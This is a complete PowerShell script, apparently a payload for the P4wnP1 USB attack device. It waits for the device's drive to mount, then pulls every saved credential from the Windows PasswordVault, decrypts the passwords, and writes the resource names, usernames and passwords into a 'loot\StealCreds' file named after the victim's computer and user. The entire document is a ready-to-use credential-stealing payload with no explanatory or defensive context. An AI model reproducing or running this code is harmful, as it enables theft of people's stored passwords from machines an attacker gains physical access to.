$drivefound=$false
while (-not $drivefound)
{
    try
    {
        $drive=Get-Volume -FileSystemLabel "P4wnP1" -ErrorAction Stop
    }
    catch 
    {
        "Waiting for P4wnP1 drive"
        sleep 1
        continue
    } 
    $dl=($drive.DriveLetter | Out-String)[0] +":"
    $drivefound=$true
}
$filename=$dl+"\loot\StealCreds\"+$env:COMPUTERNAME+"_"+$env:USERNAME+".txt"

[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
$creds = (New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll()
foreach ($c in $creds) {$c.RetrievePassword()}
$creds | Format-List -Property Resource,UserName,Password | Out-File $filename
exit

